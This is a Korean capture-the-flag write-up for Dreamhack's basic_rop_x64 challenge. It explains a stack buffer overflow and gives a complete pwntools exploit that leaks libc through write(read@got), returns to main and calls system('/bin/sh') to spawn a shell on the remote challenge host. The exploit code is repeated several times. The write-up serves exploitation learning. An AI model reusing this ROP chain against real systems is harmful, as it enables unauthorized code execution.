#ROP #GOT_Overwrite #RTL #ret2main 

### 1.  파일 정보 및 분석

file ./basic_rop_x64
./basic_rop_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=beee0ff502aca71479db7d481ef811576592438a, not stripped

$ checksec basic_rop_x64
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

ASLR 이 적용되어 있기 때문에 실행 시마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX 가 적용되어 있기 때문에  임의의 위치에 셸코드를 집어넣은 후 그 주소의 코드를 바로 실행시킬 수 없다.

Canary가 없기 때문에 스택 맨 위에 존재하는 SFP, RET 과 그 뒷 주소를 마음대로 변경하여도 프로세스가 자동 종료되지 않으며,  PIE 가 적용되지 않았기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화되지 않는다.

### 2. C 소스코드 분석

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400); // 버퍼 오버플로우 발생
    write(1, buf, sizeof(buf));

    return 0;
}
```

### 3. 익스플로잇

#### 1) Buffer Overflow

buf의 크기는 0x40 = 64 바이트이지만, 0x400 = 1024 바이트를 입력받을 수 있어 버퍼 오버플로우가 발생한다. buf 가 할당된 64 바이트 뒤에는 8바이트의 SFP와 8바이트의 RET이 위치한다.

그래서, 'A'를 72 바이트 만큼 입력해서 buf, SFP를 더미 값으로 덮고 RET를 원하는 값으로 설정하면 바이너리의 실행 흐름을 조작할 수 있다.

``` gdb
─────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7e99887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x40
 RDI  0x1
 RSI  0x7fffffffc850 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\n'
 R8   0x7fffffffc780 ◂— 0x0
 R9   0x0
 R10  0x7ffff7d8c128 ◂— 0xf002200005372 /* 'rS' */
 R11  0x246
 R12  0x7fffffffc9a8 —▸ 0x7fffffffce4e ◂— '/home/jerry/rop/basic_rop_x64'
 R13  0x4007ba (main) ◂— push rbp
 R14  0x0
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x7fffffffc898 ◂— 'bbbbbbbb\n'
 RIP  0x400819 (main+95) ◂— ret
──────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
   0x7ffff7e99887 <write+23>    cmp    rax, -0x1000
   0x7ffff7e9988d <write+29>    ja     write+112                <write+112>

   0x7ffff7e9988f <write+31>    ret
    ↓
   0x400813       <main+89>     mov    eax, 0
   0x400818       <main+94>     leave
 ► 0x400819       <main+95>     ret    <0x6262626262626262>
```

pwndbg> run <<< $(python3 -c 'print("a"*72 + "b"*8)')

"a" * 72 + "b" * 8 의 입력을 주니 0x6262626262626262("bbbbbbbb")로 리턴하는 것을 확인할 수 있다.

#### 2) system 함수 주소 계산

ASLR 이 걸려 있기 때문에, system 함수의 주소는 계속 변하게 되지만 ASLR 로 인해 변경되는 주소는 라이브러리가 매핑된 base 주소이고, 이에 따라 라이브러리 내부함수들의 offset 값은 변경되지 않는다.
그래서 base 주소를 구하면 Base 주소 + system 함수의 offset을 통해 system 함수의 주소를 구할 수 있다.

system 함수는 libc.so.6에 정의 되어 있고, 해당 라이브러리에는 read, puts, printf도 정의 되어 있다.
read 함수의 주소 - read 함수의 offset을 하면 Base 주소를 구할 수 있다.

read 함수가 실행된 후 read 함수의 주소는 GOT에 등록되어 있기 때문에, read 함수의 GOT 값을 읽으면 read 함수의 주소를 구할 수 있다.

#### 3) "/bin/sh" 문자열
```
pwndbg> search "/bin/sh"
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7f5d678 0x68732f6e69622f /* '/bin/sh' */
```

libc.so.6 라이브러리에 존재한다. 하지만 이 영역은 ASLR 의 영향을 받기 때문에, 위의 system 함수와 동일하게 Base 주소 + "/bin/sh" 문자열 offset 으로 주소를 구해야 한다.

"/bin/sh" 문자열의 offset은 아래 코드를 통해 구할 수 있다.  
pwntools의 ELF 를 사용하여 libc를 불러온 후, libc에서 search 메서드 함수를 사용한다.

```
from pwn import *

libc = ELF("./libc.so.6", checksec=False)
sh = list(libc.search(b"/bin/sh"))[0]
```

#### 4) 시나리오

라이브러리의 Base 주소를 모르기 때문에 바로 system("/bin/sh") 를 실행하기는 어려움이 있다. 따라서 ret2main기법을 사용하겠다.

ret2main 기법은 원하는 정보를 얻은 후, 다시 main 함수로 돌아와 원하는 명령을 계속 이어가는 기법이다.

먼저 write 함수를 이용해 라이브러리의 Base 주소 libc base 를 구한 후, 그를 이용해 system 함수와 "/bin/sh" 주소를 계산한 후, 두 번째 main 함수 실행 시 system("/bin/sh")를 실행할 계획이다.

**libc base 구하기**
- write(1, read@got, 8)
	- read@got 값을 출력하여 read 함수 주소 획득
- libc base = read address - read offset
	- read 함수의 주소에서 offset을 빼서 libc base 구하기
**system 함수 주소 구하기**
- system = libc base + system offset
**"/bin/sh" 주소 구하기**
- "/bin/sh" = libc base + "/bin/sh" offset
**ret2main**
write(1, read@got, 8) 의 코드 이후 main 의 주소를 넣어서 RET 를 조작하면 main 함수로 돌아올 수 있다.
**셸 획득**
위에서 system 함수의 주소와 "/bin/sh" 문자열의 주소를 구했기 때문에, pop rdi; ret 가젯을 이용하면 system("/bin/sh") 를 호출하여 셸을 획득할 수 있다.

#### 5) exploit.py

#### 초기 설정

``` python
# 익스플로잇 개발할 때 프로세스 실행, 소켓 통신, 페이로드 제작, ROP 체인 생성 등을 편하게 해 준다.
from pwn import *

# pwntools 의 success() 는 초록색으로 로그를 출력해 줌.
def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

# 익스플로잇 실행 중에 송수신하는 패킷, ROP 체인, 페이로드 길이 등을 모두 출력함.
context.log_level = 'debug'

'''
로컬에서 바이너리(./basic_rop_x64)를 직접 실행하고 그 프로세스와 상호작용할 수 있게 함.
p 객체는 이 프로세스와의 입출력을 담당(예: p.sendline(), p.recvuntil())

바이너리를 ELF 객체로 로드
e.symbols["main"], e.got["puts"], e.plt["system"] 같은 심볼 / 주소 접근 가능
e 는 프로그램 자체의 ELF 정보 저장

공격대상이 사용하는 libc 라이브러리 파일을 로드능
익스플로잇에서 system, str_bin_sh 등의 libc 심볼 주소를 얻기 위해 필요

ROP 객체 생성
주어진 ELF(e)에서 ROP 가젯ㅇ르 자동으로 찾아줌.
r.call("puts", [addr])처럼 함수 호출용 ROP 체인을 쉽게 생성 가
'''
p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

'''
실제 Return to libc 익스플로잇 준비 과정
plt(Procedure Linkage Table): 라이브러리 함수로 점프하는 트램펄린 코드 위치
got(Global Offset Table): 실제 libc 함수 주소가 저장되는 테이블
main : 프로그램의 main 함수 주소. -> 1차 페이로드 후 다시 main 으로 돌와와 2차 공격을 준비하는데 쓰임.
'''
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

'''
로드한 libc.so.6 에서 필요한 심볼들의 오프셋을 가져옴.
나중에 libc base 주소를 알아내면:
    libc_base = leaked_read - read_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + sh
이렇게 실제 런타임 주소들을 계산할 수 있음.
'''
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

'''
ROP 객체 r을 이용하여 가젯을 찾을 수 있음.
ROP 가젯 = 프로그램 코드 안의 짧은 명령어 조각
pop rdi; ret -> 64비트에서 첫 번째 인자(RDI 레지스터)에 값을 세팅할 때 사용
pop rsi; pop r15; ret -> 두 번째 인자(RSI) 세팅할 때 사용 (R15는 덤으로 버림)
이렇게 찾은 가젯주소를 변수에 저장해 두고, 페이로드에서인자 세팅시 활용함
'''
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

```

#### stage 1
``` python
# 익스플로잇 개발할 때 프로세스 실행, 소켓 통신, 페이로드 제작, ROP 체인 생성 등을 편하게 해 준다.
from pwn import *

# pwntools 의 success() 는 초록색으로 로그를 출력해 줌.
def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

# 익스플로잇 실행 중에 송수신하는 패킷, ROP 체인, 페이로드 길이 등을 모두 출력함.
context.log_level = 'debug'

'''
로컬에서 바이너리(./basic_rop_x64)를 직접 실행하고 그 프로세스와 상호작용할 수 있게 함.
p 객체는 이 프로세스와의 입출력을 담당(예: p.sendline(), p.recvuntil())

바이너리를 ELF 객체로 로드
e.symbols["main"], e.got["puts"], e.plt["system"] 같은 심볼 / 주소 접근 가능
e 는 프로그램 자체의 ELF 정보 저장

공격대상이 사용하는 libc 라이브러리 파일을 로드능
익스플로잇에서 system, str_bin_sh 등의 libc 심볼 주소를 얻기 위해 필요

ROP 객체 생성
주어진 ELF(e)에서 ROP 가젯ㅇ르 자동으로 찾아줌.
r.call("puts", [addr])처럼 함수 호출용 ROP 체인을 쉽게 생성 가
'''
# p = process("./basic_rop_x64")
p = remote("host8.dreamhack.games", 17006)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

'''
실제 Return to libc 익스플로잇 준비 과정
plt(Procedure Linkage Table): 라이브러리 함수로 점프하는 트램펄린 코드 위치
got(Global Offset Table): 실제 libc 함수 주소가 저장되는 테이블
main : 프로그램의 main 함수 주소. -> 1차 페이로드 후 다시 main 으로 돌와와 2차 공격을 준비하는데 쓰임.
'''
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

'''
로드한 libc.so.6 에서 필요한 심볼들의 오프셋을 가져옴.
나중에 libc base 주소를 알아내면:
    libc_base = leaked_read - read_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + sh
이렇게 실제 런타임 주소들을 계산할 수 있음.
'''
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

'''
ROP 객체 r을 이용하여 가젯을 찾을 수 있음.
ROP 가젯 = 프로그램 코드 안의 짧은 명령어 조각
pop rdi; ret -> 64비트에서 첫 번째 인자(RDI 레지스터)에 값을 세팅할 때 사용
pop rsi; pop r15; ret -> 두 번째 인자(RSI) 세팅할 때 사용 (R15는 덤으로 버림)
이렇게 찾은 가젯주소를 변수에 저장해 두고, 페이로드에서인자 세팅시 활용함
'''
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
'''
buf의 위치는 rbp-0x40 이므로 + SFP(8byte) -> 페이로드 0x48
'''
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
'''
여기서의 목적은 read 함수의 실제 주소를 libc에서 leak 하는 것.
write(int fd, woid *buf, size_t n) 호출 형태로 ROP 체인 구성.

순서별 해석:
pop rdi; ret → rdi = 1 (stdout)
pop rsi; pop r15; ret → rsi = read_got, r15 = dummy
(즉 write의 두 번째 인자 = read@got)
p64(8) → write의 세 번째 인자 = 8 (8바이트 출력)
write@plt → 결국 write(1, read@got, 8) 실행됨
→ 결과: read@got 에 저장된 진짜 libc의 read 함수 주소(8바이트)를 화면(stdout)에 출력.

'''
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
'''
write 호출이 끝나면 프로그램이 종료되지 않고 다시 main() 함수로 돌아가게 만듦.
이유: 1차 페이로드에서 libc 주소 leak 한 뒤, 2차 페이로드를 다시 주입하기 위함.
'''
payload += p64(main)

'''
완성된 1차 페이로드를 대상 프로그램에 전송.
C 프로그램에서 read() 함수가 입력을 받아오는 부분에 그대로 들어가게 됨.
'''
p.send(payload)

'''
p.recvuntil(b'A' * 0x40) -> ROP로 호출한 write 이전에 stdout으로 흘러나온 buf 패딩(A*0x40)을 스킵하기 위함.

이유: stdout으로 출력될 때 페이로드 패딩(A * 0x48) 중 일부가 먼저 나올 수 있음
실제로 프로그램이 write 호출 직전에 버퍼를 읽어서 스택에 채우고, write 함수가 실행되면서 stdout으로 스택 상의 일부 데이터를 먼저 찍어낼 수 있음.
b'A' * 0x40 까지 날아온 데이터는 패딩부분이므로 이를 먼저 흘려보내고 그 뒤에 나오는 read@got실제 주소 8바이트만 받아야 함.
죽, recvuntil(b'A' * 0x40)은 패딩(A들)을 스킵하고 나머지 데이터를 읽기 위해 사용.

read@got는 8바이트지만, 64비트 환경에서 상위 2바이트가 0인 경우가 많다. -> 그냥 6바이트만 recv
u64() 는 항상 8바이트 필요
그래서 뒤에 0x00 두바이트를 붙여서 64비트 주소로 변환.

????
그런데 왜 recvuntil(b'A' * 0x40)일까?
우리가 p.send(payload) 했을 때, 대상 프로그램은
    write(1, buf, sizeof(buf)) // buf(0x40)만 출력
을 실행한다.
따라서 프로그램이 화면(stdout)에 내보내는 첫 출력은 buf 내용의 "A" * 0x40 이다.
그 뒤에 우리가 ROP로 호출한 write(1, read@got, 8)의 결과(즉, libc 실제 주소)가 이어서 출력된다.
'''
p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6) + b'\x00' * 2)

'''
read의 실제 주소 - read 오프셋을 하여 libc base 값을 구한다.
이를 이용해서 system주소와 "/bin/sh"의 주소를 구한다.
'''
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

'''
local 테스트시
[+] libc base: 0x7fc8cbeeb510
remote 테스트시
[+] libc base: 0x7f895b4b9000

로컬에서 테스트하면 현재 로컬시스템인 칼리리눅스의 libc.so.6을 이용하기때문에  정확한 주소가 구해지지 않는다.
libc base 주소는 아래 3바이트가 0으로 셋팅된다.
로컬에서 올바르게 테스트하기 위해서는 도커 파일을 이용해 컨테이너를 생성하고 테스트 해야 한다.
'''
slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)
```


#### Stage 2

``` python
# 익스플로잇 개발할 때 프로세스 실행, 소켓 통신, 페이로드 제작, ROP 체인 생성 등을 편하게 해 준다.
from pwn import *

# pwntools 의 success() 는 초록색으로 로그를 출력해 줌.
def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

# 익스플로잇 실행 중에 송수신하는 패킷, ROP 체인, 페이로드 길이 등을 모두 출력함.
context.log_level = 'debug'

'''
로컬에서 바이너리(./basic_rop_x64)를 직접 실행하고 그 프로세스와 상호작용할 수 있게 함.
p 객체는 이 프로세스와의 입출력을 담당(예: p.sendline(), p.recvuntil())

바이너리를 ELF 객체로 로드
e.symbols["main"], e.got["puts"], e.plt["system"] 같은 심볼 / 주소 접근 가능
e 는 프로그램 자체의 ELF 정보 저장

공격대상이 사용하는 libc 라이브러리 파일을 로드능
익스플로잇에서 system, str_bin_sh 등의 libc 심볼 주소를 얻기 위해 필요

ROP 객체 생성
주어진 ELF(e)에서 ROP 가젯ㅇ르 자동으로 찾아줌.
r.call("puts", [addr])처럼 함수 호출용 ROP 체인을 쉽게 생성 가
'''
# p = process("./basic_rop_x64")
p = remote("host8.dreamhack.games", 17006)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

'''
실제 Return to libc 익스플로잇 준비 과정
plt(Procedure Linkage Table): 라이브러리 함수로 점프하는 트램펄린 코드 위치
got(Global Offset Table): 실제 libc 함수 주소가 저장되는 테이블
main : 프로그램의 main 함수 주소. -> 1차 페이로드 후 다시 main 으로 돌와와 2차 공격을 준비하는데 쓰임.
'''
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

'''
로드한 libc.so.6 에서 필요한 심볼들의 오프셋을 가져옴.
나중에 libc base 주소를 알아내면:
    libc_base = leaked_read - read_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + sh
이렇게 실제 런타임 주소들을 계산할 수 있음.
'''
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

'''
ROP 객체 r을 이용하여 가젯을 찾을 수 있음.
ROP 가젯 = 프로그램 코드 안의 짧은 명령어 조각
pop rdi; ret -> 64비트에서 첫 번째 인자(RDI 레지스터)에 값을 세팅할 때 사용
pop rsi; pop r15; ret -> 두 번째 인자(RSI) 세팅할 때 사용 (R15는 덤으로 버림)
이렇게 찾은 가젯주소를 변수에 저장해 두고, 페이로드에서인자 세팅시 활용함
'''
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
'''
buf의 위치는 rbp-0x40 이므로 + SFP(8byte) -> 페이로드 0x48
'''
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
'''
여기서의 목적은 read 함수의 실제 주소를 libc에서 leak 하는 것.
write(int fd, woid *buf, size_t n) 호출 형태로 ROP 체인 구성.

순서별 해석:
pop rdi; ret → rdi = 1 (stdout)
pop rsi; pop r15; ret → rsi = read_got, r15 = dummy
(즉 write의 두 번째 인자 = read@got)
p64(8) → write의 세 번째 인자 = 8 (8바이트 출력)
write@plt → 결국 write(1, read@got, 8) 실행됨
→ 결과: read@got 에 저장된 진짜 libc의 read 함수 주소(8바이트)를 화면(stdout)에 출력.

'''
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
'''
write 호출이 끝나면 프로그램이 종료되지 않고 다시 main() 함수로 돌아가게 만듦.
이유: 1차 페이로드에서 libc 주소 leak 한 뒤, 2차 페이로드를 다시 주입하기 위함.
'''
payload += p64(main)

'''
완성된 1차 페이로드를 대상 프로그램에 전송.
C 프로그램에서 read() 함수가 입력을 받아오는 부분에 그대로 들어가게 됨.
'''
p.send(payload)

'''
p.recvuntil(b'A' * 0x40) -> ROP로 호출한 write 이전에 stdout으로 흘러나온 buf 패딩(A*0x40)을 스킵하기 위함.

이유: stdout으로 출력될 때 페이로드 패딩(A * 0x48) 중 일부가 먼저 나올 수 있음
실제로 프로그램이 write 호출 직전에 버퍼를 읽어서 스택에 채우고, write 함수가 실행되면서 stdout으로 스택 상의 일부 데이터를 먼저 찍어낼 수 있음.
b'A' * 0x40 까지 날아온 데이터는 패딩부분이므로 이를 먼저 흘려보내고 그 뒤에 나오는 read@got실제 주소 8바이트만 받아야 함.
죽, recvuntil(b'A' * 0x40)은 패딩(A들)을 스킵하고 나머지 데이터를 읽기 위해 사용.

read@got는 8바이트지만, 64비트 환경에서 상위 2바이트가 0인 경우가 많다. -> 그냥 6바이트만 recv
u64() 는 항상 8바이트 필요
그래서 뒤에 0x00 두바이트를 붙여서 64비트 주소로 변환.

????
그런데 왜 recvuntil(b'A' * 0x40)일까?
우리가 p.send(payload) 했을 때, 대상 프로그램은
    write(1, buf, sizeof(buf)) // buf(0x40)만 출력
을 실행한다.
따라서 프로그램이 화면(stdout)에 내보내는 첫 출력은 buf 내용의 "A" * 0x40 이다.
그 뒤에 우리가 ROP로 호출한 write(1, read@got, 8)의 결과(즉, libc 실제 주소)가 이어서 출력된다.
'''
p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6) + b'\x00' * 2)

'''
read의 실제 주소 - read 오프셋을 하여 libc base 값을 구한다.
이를 이용해서 system주소와 "/bin/sh"의 주소를 구한다.
'''
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

'''
local 테스트시
[+] libc base: 0x7fc8cbeeb510
remote 테스트시
[+] libc base: 0x7f895b4b9000

로컬에서 테스트하면 현재 로컬시스템인 칼리리눅스의 libc.so.6을 이용하기때문에  정확한 주소가 구해지지 않는다.
libc base 주소는 아래 3바이트가 0으로 셋팅된다.
로컬에서 올바르게 테스트하기 위해서는 도커 파일을 이용해 컨테이너를 생성하고 테스트 해야 한다.
'''
slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

# Stage 2
payload: bytes = b'A' * 0x48

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```